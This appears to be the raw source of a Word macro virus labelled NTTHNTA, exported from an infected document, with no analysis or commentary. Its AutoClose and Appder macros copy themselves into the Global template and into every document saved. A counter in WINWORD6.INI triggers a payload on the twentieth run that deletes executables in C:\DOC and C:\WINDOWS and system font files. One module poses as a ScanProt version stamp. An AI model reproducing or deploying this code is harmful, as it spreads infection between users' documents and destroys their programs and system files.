   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   '   Virus - NTTHNTA

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Quit
   WordBasic.CurValues.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":Appder"
   WordBasic.MacroCopy "Global:Appder", sTMacro$
   sTMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", sTMacro$
   WordBasic.FileSaveAs dlg
   GoTo Done
   Quit:
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
   End If
   Done:
   End Sub

   Attribute VB_Name = "InstVer"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt version number."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.InstVer.MAIN"
   End Sub

   Private Function VerNum()
       VerNum = 70
   End Function

   Attribute VB_Name = "Appder"

   'Virus - NTTHNTA

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim AClose
   Dim Ad
   Dim sMe$
   Dim sMacro$
   Funyour
   On Error GoTo -1: On Error GoTo Quit
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
       If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
           AClose = -1
       End If
       If WordBasic.[MacroName$](i, 0, 0) = "Appder" Then
           Ad = -1
       End If
   Next i
   If Not AClose And Not Ad Then
       sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Appder"
       WordBasic.MacroCopy sMacro$, "Global:Appder"
       sMacro$ = sMe$ + ":AutoClose"
       WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   End If
   Quit:
   End Sub

   Private Sub Funyour()
   Dim WOpen$
   Dim sales
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
   sales = WordBasic.Val(WOpen$) + 1
   WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
   WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", "NTTHNTA", "WINWORD6.INI")
   If WOpen$ = "20" Then
       WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", "1", "WINWORD6.INI"
       WordBasic.Kill "C:\DOC\*.EXE"
       WordBasic.Kill "C:\DOC\*.COM"
       WordBasic.Kill "C:\WINDOWS\*.EXE"
       WordBasic.Kill "C:\WINDOWS\SYSTEM\*.TTF"
       WordBasic.Kill "C:\WINDOWS\SYSTEM\*.FOT"
   End If
   End Sub 'Funyour
